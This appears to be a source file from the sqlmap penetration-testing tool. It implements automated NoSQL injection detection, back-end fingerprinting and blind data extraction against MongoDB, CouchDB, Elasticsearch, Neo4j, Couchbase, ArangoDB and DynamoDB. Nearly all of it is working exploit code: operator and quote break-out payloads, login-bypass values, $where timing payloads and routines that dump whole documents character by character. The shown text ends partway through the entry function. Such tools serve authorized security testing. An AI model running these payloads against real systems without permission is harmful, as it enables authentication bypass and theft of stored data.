#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import difflib
import json
import re
import time

from collections import namedtuple
from collections import OrderedDict

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.core.enums import POST_HINT
from lib.core.settings import NOSQL_CHAR_MAX
from lib.core.settings import NOSQL_CHAR_MIN
from lib.core.settings import NOSQL_ERROR_REGEX
from lib.core.settings import NOSQL_MAX_FIELDS
from lib.core.settings import NOSQL_MAX_LENGTH
from lib.core.settings import NOSQL_MAX_RECORDS
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange
from thirdparty.six.moves import urllib as _urllib

# Improbable literal used to build always-true/never-match payloads. Randomized per run (like
# kb.chars boundaries) so it never becomes a static signature a WAF can pin a blocking rule on.
NOSQL_SENTINEL = randomStr(length=10, lowercase=True)

# Maximum number of characters of in-band (reflected) data surfaced from an always-true response
NOSQL_DUMP_LIMIT = 4096

# Delivery shapes that can carry an injection into a back-end filter/query
NOSQL_PLACES = (PLACE.GET, PLACE.POST, PLACE.URI, PLACE.CUSTOM_POST, PLACE.COOKIE)

# Lucene regexp metacharacters (Elasticsearch/Solr) requiring escaping in built patterns
LUCENE_META = set('.?+*|(){}[]"\\/')

# Java regexp metacharacters (Cypher/AQL =~) requiring escaping in built patterns
JAVA_META = set('.?+*|(){}[]^$\\/')

# Engines detectable through a syntax-breaking probe but lacking a clean substring oracle for blind
# extraction (mapped from recognizable error-message fragments - not product names - to back-end name)
ERROR_SIGNATURES = (
    ("Cassandra", ("no viable alternative at input", "org.apache.cassandra", "com.datastax", "invalidrequestexception")),
    ("Redis", ("wrongtype operation", "err error compiling script", "err error running script", "@user_script", "replyerror")),
    ("Memcached", ("client_error bad", "server_error object too large")),
    ("InfluxDB", ("error parsing query", "unable to parse")),
    ("HBase/Phoenix", ("org.apache.phoenix", "phoenixparserexception", "org.apache.hadoop.hbase")),
)

_UNSET = object()

# HTTP status of the most recent request issued by _send() (None when bypassed, e.g. under tests)
_lastCode = None

# Resolved injection vector. `template` is the always-true page for content-based blind extraction
# (None for time-based/detection-only); `bypass` is the always-true payload reported as a login/filter
# bypass; `truth` overrides the content oracle (e.g. a timing predicate for the $where time-based path);
# `dump` is a callable returning (columns, rows) for a whole-document dump (server-side-JS key enumeration).
Vector = namedtuple("Vector", ("dbms", "fetch", "lengthValue", "charValue", "template", "bypass", "truth", "dump"))
Vector.__new__.__defaults__ = (None, None, None, None)

def _ratio(first, second):
    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()

def _encode(value):
    return _urllib.parse.quote(value, safe="")

def _lucene(value):
    return "".join(("\\" + _ if _ in LUCENE_META else _) for _ in value)

def _javaEscape(value):
    return "".join(("\\" + _ if _ in JAVA_META else _) for _ in value)

def _quoted(regex):
    # double every backslash so a regexp survives a single-quoted string literal (Cypher/AQL/N1QL),
    # whose own backslash processing would otherwise strip one level before the engine parses it
    return regex.replace("\\", "\\\\")

def _isJsonBody():
    return kb.postHint in (POST_HINT.JSON, POST_HINT.JSON_LIKE)

def _jsonKey(parameter):
    for prefix in ("JSON ", "JSON-like "):
        if parameter.startswith(prefix):
            return parameter[len(prefix):]
    return parameter

def _delim(place):
    # parameter delimiter for the place: ';' for cookies (per --cookie-del), '&' otherwise
    return (conf.cookieDel or ';') if place == PLACE.COOKIE else '&'

def _originalValue(place, parameter):
    for segment in conf.parameters[place].split(_delim(place)):
        name, _, value = segment.partition('=')
        if name.strip() == parameter:
            return value
    return conf.paramDict.get(place, {}).get(parameter) or ""

def _replaceSegment(place, parameter, segment):
    """Rebuild conf.parameters[place], swapping the target parameter for `segment` (e.g. 'k[$ne]=v'
    or 'k=v') while preserving every sibling parameter verbatim"""

    delimiter = _delim(place)
    retVal, replaced = [], False

    for part in conf.parameters[place].split(delimiter):
        if not replaced and part.split('=', 1)[0].strip() == parameter:
            retVal.append(segment)
            replaced = True
        else:
            retVal.append(part)

    if not replaced:
        retVal = [segment if name == parameter else "%s=%s" % (_encode(name), _encode(value)) for name, value in conf.paramDict[place].items()]

    return delimiter.join(retVal)

def _send(place, parameter, segment=None, jsonValue=_UNSET):
    """Issues a single request with the target parameter overridden - by raw 'name=value' segment for
    URL/body parameters, or by setting the key to `jsonValue` for JSON bodies - returning the response"""

    global _lastCode

    skipUrlEncode = conf.skipUrlEncode
    conf.skipUrlEncode = True

    if conf.delay:
        time.sleep(conf.delay)

    try:
        kwargs = {"raise404": False, "silent": True}

        if jsonValue is not _UNSET and _isJsonBody() and place in (PLACE.POST, PLACE.CUSTOM_POST):
            try:
                data = json.loads(conf.data)
            except Exception:
                data = {}
            data[_jsonKey(parameter)] = jsonValue
            payload = kwargs["post"] = json.dumps(data)
        elif place == PLACE.COOKIE:
            payload = kwargs["cookie"] = _replaceSegment(place, parameter, segment)
        else:
            payload = _replaceSegment(place, parameter, segment)
            kwargs["post" if place in (PLACE.POST, PLACE.CUSTOM_POST) else "get"] = payload

        logger.log(CUSTOM_LOGGING.PAYLOAD, _urllib.parse.unquote(payload))     # readable, surfaced at -v 3 like a regular sqlmap payload
        page, _, _lastCode = Request.getPage(**kwargs)
    finally:
        conf.skipUrlEncode = skipUrlEncode

    return page or ""

def _isError(page):
    # a server-error status or a recognizable back-end error body marks a response as NOT a valid
    # always-true template (prevents two differing error pages from faking a boolean oracle)
    return (_lastCode or 0) >= 500 or bool(re.search(NOSQL_ERROR_REGEX, page or ""))

def _fetch(place, parameter, op, value, isArray=False):
    """MongoDB/CouchDB dialect: renders the parameter as an operator object (bracket or JSON shape)"""

    suffix = ("[%s][]" % op) if isArray else ("[%s]" % op)
    segment = "%s%s=%s" % (_encode(parameter), suffix, _encode(value))
    return _send(place, parameter, segment, {op: [value]} if isArray else {op: value})

def _fetchValue(place, parameter, value):
    """String dialects (Lucene query_string, Cypher, AQL): replaces the parameter's value verbatim"""

    return _send(place, parameter, "%s=%s" % (_encode(parameter), _encode(value)), value)

def _boolean(truthy, falsy):
    """Returns the (reproducible) true-page when a NoSQL true/false payload pair yields a stable
    content divergence - i.e. the payload reached and influenced the back-end - else None"""

    truePage = truthy()
    if not truePage or _isError(truePage):      # an error response is never a valid always-true template
        return None

    falsePage = falsy()
    if _ratio(truePage, truthy()) > UPPER_RATIO_BOUND and _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
        return truePage

    return None

def _detectMongo(place, parameter):
    # $ne (matches everything) vs $in [sentinel] (matches nothing); $gt '' (matches any string) is a
    # fallback always-true for apps that filter $ne but not the comparison operators
    return _boolean(lambda: _fetch(place, parameter, "$ne", NOSQL_SENTINEL), lambda: _fetch(place, parameter, "$in", NOSQL_SENTINEL, isArray=True)) \
        or _boolean(lambda: _fetch(place, parameter, "$gt", ""), lambda: _fetch(place, parameter, "$in", NOSQL_SENTINEL, isArray=True))

def _detectES(place, parameter):
    # query_string '*' (matches everything) vs a literal sentinel (matches nothing)
    return _boolean(lambda: _fetchValue(place, parameter, '*'), lambda: _fetchValue(place, parameter, NOSQL_SENTINEL))

def _detectCypher(place, parameter):
    # single-quote break-out: OR '1'='1' (true) vs OR '1'='2' (false)
    return _boolean(lambda: _fetchValue(place, parameter, NOSQL_SENTINEL + "' OR '1'='1"), lambda: _fetchValue(place, parameter, NOSQL_SENTINEL + "' OR '1'='2"))

def _detectAQL(place, parameter):
    # single-quote break-out: || '1'=='1 (true) vs || '1'=='2 (false)
    return _boolean(lambda: _fetchValue(place, parameter, NOSQL_SENTINEL + "' || '1'=='1"), lambda: _fetchValue(place, parameter, NOSQL_SENTINEL + "' || '1'=='2"))

def _detectNumeric(place, parameter):
    # unquoted (numeric-context) boolean break-out for SQL-like back-ends: OR/AND (Cypher/N1QL) or
    # ||/&& (AQL). A numeric field is not blindly regexp-extractable, so exploitation is the in-band
    # dump of the always-true response (rows reflected by the page)
    value = (_originalValue(place, parameter) or "1").strip()
    if not value.isdigit():
        return None

    template = _boolean(lambda: _fetchValue(place, parameter, "%s OR 1=1" % value), lambda: _fetchValue(place, parameter, "%s AND 1=2" % value))
    if template:
        # Cypher, N1QL and PartiQL share OR/AND; tell them apart by a constant-arg, field-free primitive
        # each engine alone honors: N1QL REGEXP_CONTAINS, DynamoDB begins_with (Cypher has neither)
        if _confirm(place, parameter, "%s OR REGEXP_CONTAINS('ab', 'a') OR 1=2" % value, "%s OR REGEXP_CONTAINS('ab', 'z') OR 1=2" % value):
            dbms = "Couchbase"
        elif _confirm(place, parameter, "%s OR begins_with('ab', 'a') OR 1=2" % value, "%s OR begins_with('ab', 'z') OR 1=2" % value):
            dbms = "DynamoDB"
        else:
            dbms = "Neo4j"
        return dbms, template, "%s OR 1=1" % value

    template = _boolean(lambda: _fetchValue(place, parameter, "%s || 1==1" % value), lambda: _fetchValue(place, parameter, "%s && 1==2" % value))
    if template:
        return "ArangoDB", template, "%s || 1==1" % value

    return None

def _detectError(place, parameter):
    # last-resort: a syntax-breaking value that diverges from a normal one and surfaces an engine error
    original = _originalValue(place, parameter) or '1'
    normal = _fetchValue(place, parameter, original)
    broken = _fetchValue(place, parameter, original + "'")

    if not normal or _ratio(normal, broken) >= UPPER_RATIO_BOUND:
        return None

    for engine, tokens in ERROR_SIGNATURES:
        if any(_ in broken.lower() for _ in tokens):
            return engine

    return None

def _fingerprintMongo(place, parameter):
    page = _fetch(place, parameter, "$regex", '(').lower()       # invalid regexp -> driver/DB error
    if any(_ in page for _ in ("couch", "mango", "bad_arg", "erlang")):
        return "CouchDB"
    elif any(_ in page for _ in ("mongo", "bson", "regular expression", "$regex")):
        return "MongoDB"
    else:
        return "MongoDB (assumed)"

def _fingerprintLucene(place, parameter):
    page = _fetchValue(place, parameter, "/[/").lower()          # invalid regexp -> engine error
    if any(_ in page for _ in ("solr", "solrexception")):
        return "Solr"
    elif "opensearch" in page:
        return "OpenSearch"
    else:
        return "Elasticsearch"

def _constraint(place, parameter, eq='=', conj=" AND ", prefix="u."):
    """Re-expresses sibling parameters as query constraints (field == parameter name) so extraction
    stays bound to the originally matched record. `prefix`/`eq`/`conj` adapt the per-dialect syntax
    (Cypher: 'u.'/'='/' AND '; AQL: 'u.'/'=='/' && '; $where JS: 'this.'/'=='/'&&')"""

    parts = []

    for segment in conf.parameters[place].split(_delim(place)):
        if '=' not in segment:
            continue
        name, _, value = segment.partition('=')
        name = name.strip()
        if name and name != parameter:
            parts.append("%s%s%s'%s'" % (prefix, name, eq, value))

    return (conj.join(parts) + conj) if parts else ""

def _confirm(place, parameter, truePayload, falsePayload):
    # disambiguates dialects that share the same break-out syntax by probing a dialect-specific
    # regexp-match primitive (e.g. Cypher '=~' vs N1QL 'REGEXP_CONTAINS') for a true/false divergence
    return _boolean(lambda: _fetchValue(place, parameter, truePayload), lambda: _fetchValue(place, parameter, falsePayload)) is not None

def _timed(call):
    start = time.time()
    call()
    return time.time() - start

def _whereDelay(condition):
    # MongoDB $where (server-side JS) string break-out: busy-loops for ~conf.timeSec seconds whenever
    # the per-document JS `condition` holds, yielding a timing oracle when no content differential
    # exists. The document is passed in as `d` (inside the function `this` is not the document).
    return "%s' || (function(d){if(%s){var t=new Date().getTime();while(new Date().getTime()-t<%d){}}return false})(this) || '1'=='2" % (NOSQL_SENTINEL, condition, int(conf.timeSec * 1000))

def _detectWhere(place, parameter):
    # an unconditional-delay payload must run ~conf.timeSec slower than the baseline while a
    # non-delaying one stays fast (the latter guards against a uniformly slow endpoint)
    threshold = _timed(lambda: _fetchValue(place, parameter, _originalValue(place, parameter) or "1")) + conf.timeSec * 0.5
    if threshold < conf.timeSec and _timed(lambda: _fetchValue(place, parameter, _whereDelay("true"))) > threshold:
        if _timed(lambda: _fetchValue(place, parameter, "%s' || '1'=='2" % NOSQL_SENTINEL)) <= threshold:
            return threshold
    return None

def _jsString(value):
    return "'%s'" % value.replace("\\", "\\\\").replace("'", "\\'")

def _whereField(place, parameter, bound, expr, threshold):
    """Time-based recovery of an arbitrary per-document JavaScript string expression `expr` (e.g. a key
    name 'Object.keys(d)[i]', or a value 'String(d[name])') via the $where busy-loop oracle"""

    truth = lambda payload: _timed(lambda: _fetchValue(place, parameter, payload)) > threshold
    return _extract(None, None,
                    lambda n: _whereDelay("%s(%s)&&(%s).length>=%d" % (bound, expr, expr, n)),
                    lambda known, klass: _whereDelay("%s/^%s%s/.test(%s)" % (bound, _javaEscape(known), klass, expr)),
                    truth)

def _whereDump(place, parameter, bound, threshold):
    """Whole-document dump via server-side-JavaScript key enumeration: walk Object.keys(this) to recover
    each field name, then String(this[name]) for its value. Returns (columns, rows) or None"""

    columns, values = [], []
    for index in xrange(NOSQL_MAX_FIELDS):
        name = _whereField(place, parameter, bound, "Object.keys(d)[%d]" % index, threshold)
        if not name:
            break
        columns.append(name)
        values.append(_whereField(place, parameter, bound, "String(d[%s])" % _jsString(name), threshold) or "")
        logger.info("retrieved: %s='%s'" % (name, values[-1]))

    return (columns, [values]) if columns else None

def _classChar(ordinal):
    char = chr(ordinal)
    return ("\\" + char) if char in "]\\^-" else char       # escape the char-class metacharacters

def _klass(low, high):
    # a regexp character class spanning the codepoints [low, high] (single member when low == high)
    return "[%s]" % _classChar(low) if low == high else "[%s-%s]" % (_classChar(low), _classChar(high))

def _propLiteral(name):
    return "'%s'" % name.replace("\\", "\\\\").replace("'", "\\'")

def _enumField(place, parameter, template, payloadFor):
    """Content-based recovery of the string matched by a regexp clause built via payloadFor(regexBody),
    reusing the bisection extractor against the always-true single-record `template`"""

    return _extract(template, lambda value: _fetchValue(place, parameter, value),
                    lambda n: payloadFor(".{%d,}" % n),
                    lambda known, klass: payloadFor(_quoted(_javaEscape(known) + klass)))

def _enumDump(place, parameter, makePayload, keysExpr, valueExpr):
    """Whole-document dump via key enumeration for the regexp dialects: keysExpr(i) -> the i-th field
    name, valueExpr(name) -> that field's value. makePayload(targetExpr, regexBody) wraps the dialect
    break-out and record binding around a '<targetExpr> matches ^<regexBody>' oracle. Returns
    (columns, rows) or None - the caller can then fall back to single-field extraction"""

    template = _fetchValue(place, parameter, makePayload(keysExpr(0), ".*"))      # the bound single record
    if not template or _isError(template):
        return None

    columns, values = [], []
    for index in xrange(NOSQL_MAX_FIELDS):
        name = _enumField(place, parameter, template, lambda rb, i=index: makePayload(keysExpr(i), rb))
        if not name:
            break
        columns.append(name)
        values.append(_enumField(place, parameter, template, lambda rb, n=name: makePayload(valueExpr(n), rb)) or "")
        logger.info("retrieved: %s='%s'" % (name, values[-1]))

    return (columns, [values]) if columns else None

def _cypherDump(place, parameter):
    """Blind multi-record collection dump (Neo4j Cypher). Walks every matched node in ascending order
    of its internal node id (a unique, ordered, always-present key - unlike property order, which Neo4j
    does not guarantee), key-enumerating each node's full document. Returns (columns, rows) or None"""

    fetch = lambda payload: _fetchValue(place, parameter, payload)
    noMatch = fetch("%s' OR '1'='2" % NOSQL_SENTINEL)               # stable zero-record baseline (app closes the quote)
    differs = lambda payload: _ratio(fetch(payload), noMatch) < UPPER_RATIO_BOUND
    if not noMatch or not differs("%s' OR '1'='1" % NOSQL_SENTINEL):
        return None

    # a numeric condition opens no string, so balance the app's trailing quote with a tautology
    exists = lambda cond: differs("%s' OR %s AND '1'='1" % (NOSQL_SENTINEL, cond))

    def minIdGreater(lower):
        # smallest internal node id strictly greater than `lower` (None when no further node exists)
        if not exists("id(u) > %d" % lower):
            return None
        hi = lower + 1
        while not exists("id(u) > %d AND id(u) <= %d" % (lower, hi)):
            hi *= 2
            if hi > (1 << 40):
                return None
        lo = lower
        while lo + 1 < hi:
            mid = (lo + hi) // 2
            if exists("id(u) > %d AND id(u) <= %d" % (lower, mid)):
                hi = mid
            else:
                lo = mid
        return hi

    columns, records, lastId = [], [], -1
    for _ in xrange(NOSQL_MAX_RECORDS):
        nodeId = minIdGreater(lastId)
        if nodeId is None:
            break
        record = _enumDump(place, parameter,
                           lambda expr, rb, k=nodeId: "%s' OR id(u)=%d AND %s =~ '^%s.*" % (NOSQL_SENTINEL, k, expr, rb),
                           lambda i: "keys(u)[%d]" % i, lambda n: "toString(u[%s])" % _propLiteral(n))
        if record:
            cols, values = record
            records.append(dict(zip(cols, values[0])))     # align by field name (keys(u) order is per-node)
            columns.extend(_ for _ in cols if _ not in columns)
        lastId = nodeId

    return (columns, [[row.get(_, "") for _ in columns] for row in records]) if records else None

def _partiqlValue(place, parameter, bind, field):
    """Blind extraction of `field` for the bound record on a DynamoDB PartiQL point. PartiQL has no
    regexp, so each character is recovered by an ordered string comparison (field >= 'prefix'+char),
    bisected over the printable-ASCII range. Returns the value or None"""

    quote = lambda value: value.replace("'", "''")              # PartiQL escapes a single quote by doubling it
    fetch = lambda payload: _fetchValue(place, parameter, payload)
    template = fetch("%s' OR %s%s >= '" % (NOSQL_SENTINEL, bind, field))     # field >= '' -> bound record matches
    if not template or _isError(template):
        return None

    truth = lambda value: _ratio(fetch("%s' OR %s%s >= '%s" % (NOSQL_SENTINEL, bind, field, quote(value))), template) > UPPER_RATIO_BOUND

    retVal = ""
    while len(retVal) < NOSQL_MAX_LENGTH:
        if not truth(retVal + chr(NOSQL_CHAR_MIN)):             # no character at this position -> end of value
            break
        lo, hi = NOSQL_CHAR_MIN, NOSQL_CHAR_MAX
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if truth(retVal + chr(mid)):
                lo = mid
            else:
                hi = mid - 1
        retVal += chr(lo)

    return retVal or None

def _partiqlDump(place, parameter, key):
    """DynamoDB PartiQL: comparison-extract the injected field, bound to its record by sibling
    parameters (PartiQL exposes no key-enumeration, so the dumpable field is the injected one)"""

    bind = _constraint(place, parameter, "=", " AND ", prefix="")
    if not bind:                                                # need a sibling to pin a single record
        return None
    value = _partiqlValue(place, parameter, bind, key)
    return ([key], [[value]]) if value is not None else None

def _extract(template, fetchFn, lengthValue, charValue, truthFn=None):
    """Blind value recovery: binary-searches the length, then bisects each character's codepoint over
    the printable-ASCII range using regexp character-class ranges (sqlmap-style inference, ~log2(range)
    requests per character instead of a linear scan - far smaller WAF/log footprint). lengthValue(n)
    and charValue(known, charClass) render the dialect payload; the oracle is the content ratio against
    `template` by default, or `truthFn(payload)` (e.g. the $where timing predicate)"""

    truth = truthFn or (lambda value: _ratio(fetchFn(value), template) > UPPER_RATIO_BOUND)

    length, probe = 0, 1
    while probe <= NOSQL_MAX_LENGTH and truth(lengthValue(probe)):
        length, probe = probe, probe * 2

    low, high = length, min(probe, NOSQL_MAX_LENGTH + 1)
    while low + 1 < high:
        mid = (low + high) // 2
        if truth(lengthValue(mid)):
            low = mid
        else:
            high = mid

    if not low:
        return None

    debugMsg = "retrieving the value (%d characters)" % low
    logger.debug(debugMsg)

    retVal = ""
    for _ in xrange(low):
        lo, hi = NOSQL_CHAR_MIN, NOSQL_CHAR_MAX
        if not truth(charValue(retVal, _klass(lo, hi))):
            retVal += '?'                                       # character outside the printable-ASCII range
            continue
        while lo < hi:
            mid = (lo + hi) // 2
            if truth(charValue(retVal, _klass(lo, mid))):
                hi = mid
            else:
                lo = mid + 1
        retVal += chr(lo)

    return retVal

def _resolve(place, parameter, key):
    """Tries each NoSQL dialect in turn; the first that detects fixes the back-end and the extraction
    payloads. Returns a Vector (whose `template`/`lengthValue` are None for detection-only back-ends)
    or None when nothing matches"""

    field = "u.%s" % key

    template = _detectMongo(place, parameter)
    if template:
        return Vector(_fingerprintMongo(place, parameter),
                      lambda value: _fetch(place, parameter, "$regex", value),
                      lambda n: "^.{%d,}$" % n,
                      lambda known, klass: "^%s%s" % (re.escape(known), klass),
                      template=template, bypass='{"$ne": null}')

    template = _detectES(place, parameter)
    if template:
        return Vector(_fingerprintLucene(place, parameter),
                      lambda value: _fetchValue(place, parameter, value),
                      lambda n: "/.{%d,}/" % n,
                      lambda known, klass: "/%s%s.*/" % (_lucene(known), klass),
                      template=template, bypass='*')

    template = _detectCypher(place, parameter)
    if template:
        constraint = _constraint(place, parameter)

        # Neo4j Cypher, Couchbase N1QL and DynamoDB PartiQL all share the ' OR '1'='1 break-out; tell
        # them apart by the regexp/string primitive the back-end honors ('=~', 'REGEXP_CONTAINS', or
        # PartiQL 'begins_with')
        if not _confirm(place, parameter, "%s' OR %s%s =~ '.*" % (NOSQL_SENTINEL, constraint, field), "%s' OR %s%s =~ '%s" % (NOSQL_SENTINEL, constraint, field, NOSQL_SENTINEL)):
            if _confirm(place, parameter, "%s' OR REGEXP_CONTAINS(%s, '.*') OR '1'='2" % (NOSQL_SENTINEL, field), "%s' OR REGEXP_CONTAINS(%s, '%s') OR '1'='2" % (NOSQL_SENTINEL, field, NOSQL_SENTINEL)):
                return Vector("Couchbase",
                              lambda value: _fetchValue(place, parameter, value),
                              lambda n: "%s' OR REGEXP_CONTAINS(%s, '^.{%d,}') OR '1'='2" % (NOSQL_SENTINEL, field, n),
                              lambda known, klass: "%s' OR REGEXP_CONTAINS(%s, '^%s') OR '1'='2" % (NOSQL_SENTINEL, field, _quoted(_javaEscape(known) + klass)),
                              template=template, bypass="' OR '1'='1",
                              dump=lambda: _enumDump(place, parameter,
                                                     lambda expr, rb: "%s' OR REGEXP_CONTAINS(%s, '^%s') OR '1'='2" % (NOSQL_SENTINEL, expr, rb),
                                                     lambda i: "OBJECT_NAMES(u)[%d]" % i, lambda n: "TOSTRING(u[%s])" % _propLiteral(n)))

            if _confirm(place, parameter, "%s' OR begins_with(%s, '') OR '1'='2" % (NOSQL_SENTINEL, key), "%s' OR begins_with(%s, '%s') OR '1'='2" % (NOSQL_SENTINEL, key, NOSQL_SENTINEL)):
                return Vector("DynamoDB", None, None, None, template=template, bypass="' OR '1'='1",
                              dump=lambda: _partiqlDump(place, parameter, key))

        return Vector("Neo4j", None, None, None, template=template, bypass="' OR '1'='1",
                      dump=lambda: _cypherDump(place, parameter) or _enumDump(place, parameter,
                                             lambda expr, rb: "%s' OR %s%s =~ '^%s.*" % (NOSQL_SENTINEL, constraint, expr, rb),
                                             lambda i: "keys(u)[%d]" % i, lambda n: "toString(u[%s])" % _propLiteral(n)))

    template = _detectAQL(place, parameter)
    if template:
        constraint = _constraint(place, parameter, "==", " && ")

        # ArangoDB AQL and MongoDB $where (server-side JavaScript) both satisfy the ' || '1'=='1
        # break-out; tell them apart by which regexp-match primitive holds - AQL '=~' or a JS /re/.test()
        if not _confirm(place, parameter, "%s' || ('x' =~ '.') || '1'=='2" % NOSQL_SENTINEL, "%s' || ('x' =~ 'y') || '1'=='2" % NOSQL_SENTINEL) \
           and _confirm(place, parameter, "%s' || /./.test('x') || '1'=='2" % NOSQL_SENTINEL, "%s' || /y/.test('x') || '1'=='2" % NOSQL_SENTINEL):
            bound = _constraint(place, parameter, "==", "&&", prefix="this.")
            whereTemplate = _fetchValue(place, parameter, "%s' || (%sthis.%s) || '1'=='2" % (NOSQL_SENTINEL, bound, key))
            return Vector("MongoDB ($where)",
                          lambda value: _fetchValue(place, parameter, value),
                          lambda n: "%s' || (%sthis.%s&&this.%s.length>=%d) || '1'=='2" % (NOSQL_SENTINEL, bound, key, key, n),
                          lambda known, klass: "%s' || (%sthis.%s&&/^%s%s/.test(this.%s)) || '1'=='2" % (NOSQL_SENTINEL, bound, key, _javaEscape(known), klass, key),
                          template=whereTemplate, bypass="' || '1'=='1")

        return Vector("ArangoDB",
                      lambda value: _fetchValue(place, parameter, value),
                      lambda n: "%s' || (%s%s =~ '^.{%d,}') || '1'=='2" % (NOSQL_SENTINEL, constraint, field, n),
                      lambda known, klass: "%s' || (%s%s =~ '^%s') || '1'=='2" % (NOSQL_SENTINEL, constraint, field, _quoted(_javaEscape(known) + klass)),
                      template=template, bypass="' || '1'=='1",
                      dump=lambda: _enumDump(place, parameter,
                                             lambda expr, rb: "%s' || (%s%s =~ '^%s') || '1'=='2" % (NOSQL_SENTINEL, constraint, expr, rb),
                                             lambda i: "ATTRIBUTES(u)[%d]" % i, lambda n: "TO_STRING(u[%s])" % _propLiteral(n)))

    numeric = _detectNumeric(place, parameter)
    if numeric:
        dbms, template, bypass = numeric
        dump = None
        if dbms == "Neo4j":                                     # bind the dump to the injected numeric field (e.g. u.id = 1)
            value = (_originalValue(place, parameter) or "1").strip()
            dump = lambda: _enumDump(place, parameter,
                                     lambda expr, rb: "%s AND (%s =~ '^%s.*')" % (value, expr, rb),
                                     lambda i: "keys(u)[%d]" % i, lambda n: "toString(u[%s])" % _propLiteral(n))
        return Vector(dbms, None, None, None, template=template, bypass=bypass, dump=dump)

    threshold = _detectWhere(place, parameter)
    if threshold is not None:
        bound = _constraint(place, parameter, "==", "&&", prefix="d.")
        return Vector("MongoDB ($where)", None, None, None,
                      dump=lambda: _whereDump(place, parameter, bound, threshold))

    engine = _detectError(place, parameter)
    if engine:
        return Vector(engine, None, None, None)

    return None

def _inband(place, parameter, template):
    """In-band data exposure gate: returns the always-true response when it carries materially more
    (reflected) content than the original request - i.e. the injection is returning extra records
    directly - else None"""

    original = _fetchValue(place, parameter, _originalValue(place, parameter) or "1")
    if template and len(template) > len(original) and _ratio(template, original) < UPPER_RATIO_BOUND and not re.search(NOSQL_ERROR_REGEX, template):
        return template
    return None

def _clean(cell):
    cell = re.sub(r"(?s)<[^>]+>", "", cell)
    for entity, char in (("&amp;", '&'), ("&lt;", '<'), ("&gt;", '>'), ("&quot;", '"'), ("&#39;", "'"), ("&apos;", "'")):
        cell = cell.replace(entity, char)
    return re.sub(r"\s+", " ", cell).strip()

def _records(page):
    """Parses structured records out of a reflected response - a JSON array of objects or an HTML
    table - returning (columns, rows) for a tabular dump, else None"""

    try:
        data = json.loads(page, object_pairs_hook=OrderedDict)
        rows = data if isinstance(data, list) else next((_ for _ in data.values() if isinstance(_, list)), None) if isinstance(data, dict) else None
        rows = [_ for _ in (rows or []) if isinstance(_, dict)]
        if rows:
            columns = []
            for row in rows:
                columns.extend(_ for _ in row if _ not in columns)
            return columns, [[("NULL" if row[_] is None else _clean("%s" % row[_])) if _ in row else "" for _ in columns] for row in rows]
    except (ValueError, TypeError):
        pass

    for body in re.findall(r"(?is)<table[^>]*>(.*?)</table>", page or ""):
        header, rows = None, []
        for index, tr in enumerate(re.findall(r"(?is)<tr[^>]*>(.*?)</tr>", body)):
            cells = re.findall(r"(?is)<t[dh][^>]*>(.*?)</t[dh]>", tr)
            if index == 0 and re.search(r"(?i)<th[\s>]", tr):
                header = [_clean(_) for _ in cells]
            elif cells:
                rows.append([_clean(_) for _ in cells])
        if rows:
            width = max(len(_) for _ in rows)
            columns = header if header and len(header) == width else ["column_%d" % (_ + 1) for _ in xrange(width)]
            return columns, [row + [""] * (width - len(row)) for row in rows]

    return None

def _grid(columns, rows):
    """Renders (columns, rows) as a sqlmap-style ASCII table"""

    widths = [max([len(columns[index])] + [len(row[index]) for row in rows if index < len(row)]) for index in xrange(len(columns))]
    separator = '+' + '+'.join('-' * (width + 2) for width in widths) + '+'
    line = lambda cells: "| " + " | ".join((cells[index] if index < len(cells) else "").ljust(widths[index]) for index in xrange(len(columns))) + " |"
    return "\n".join([separator, line(columns), separator] + [line(row) for row in rows] + [separator])

def _dumpInband(place, key, page):
    """Renders in-band records as a regular sqlmap-style table, or falls back to cleaned text"""

    parsed = _records(page)
    if parsed:
        columns, rows = parsed
        conf.dumper.singleString("NoSQL: %s parameter '%s' in-band records [%d]:\n%s" % (place, key, len(rows), _grid(columns, rows)))
    else:
        text = re.sub(r"\s+", " ", re.sub(r"(?s)<[^>]+>", " ", page)).strip()
        conf.dumper.singleString("NoSQL: %s parameter '%s' in-band data: %s" % (place, key, text[:NOSQL_DUMP_LIMIT]))

def nosqlScan():
    """Entry point for '--nosql': detects NoSQL injection (MongoDB/CouchDB operator, Lucene
    query_string, Cypher/N1QL/AQL string break-out, MongoDB $where time-based, or error-based). On a
    confirmed point it tries, in order, to (1) dump records exposed in-band by the always-true payload
    and (2) blindly recover the targeted field via the regexp/timing oracle"""

    global NOSQL_SENTINEL
    NOSQL_SENTINEL = randomStr(length=10, lowercase=True)

    # NoSQL injection from an application-scoped point is confined to the back-end's single query
    # (one collection/label) - it confirms and dumps what that query can reach, with no analog to the
    # SQL database/table/user/banner enumeration, so those switches do not apply here
    debugMsg = "'--nosql' is self-contained: it confirms the injection and dumps the reachable "
    debugMsg += "collection/document. SQL enumeration switches (e.g. --banner, --dbs, --tables, "
    debugMsg += "--users, --sql-query) do not map to a NoSQL back-end and are ignored"
    logger.debug(debugMsg)

    tested = found = 0

    for place in (_ for _ in NOSQL_PLACES if _ in conf.paramDict):
        # mirror sqlmap's SQL place level-gating: Cookie parameters are only tested at --level >= 2
        if place == PLACE.COOKIE and conf.level < 2:
            continue
        for parameter in list(conf.paramDict[place].keys()):
            key = _jsonKey(parameter)

            if conf.testParameter and not any(_ in conf.testParameter for _ in (key, parameter)):
                continue

            tested += 1
            infoMsg = "testing NoSQL injection on %s parameter '%s'" % (place, key)
            logger.info(infoMsg)

            vector = _resolve(place, parameter, key)
            if not vector:
                continue

            found += 1
            infoMsg = "%s parameter '%s' is vulnerable to NoSQL injection (back-end: '%s')" % (place, key, vector.dbms)
            logger.info(infoMsg)
            if conf.beep:
                beep()

            # standard sqlmap-style injection-point summary (reproducible vector)
            if vector.bypass == '{"$ne": null}':
                title, payload = "operator injection", "%s[$ne]=%s" % (key, NOSQL_SENTINEL)
            elif vector.bypass == '*':
                title, payload = "Lucene query_string injection", "%s=*" % key
            elif vector.bypass:
                context = "numeric" if vector.bypass[:1].isdigit() else "string"
                title, payload = "boolean-based blind (%s)" % context, "%s=%s" % (key, vector.bypass)
            elif vector.dump is not None:
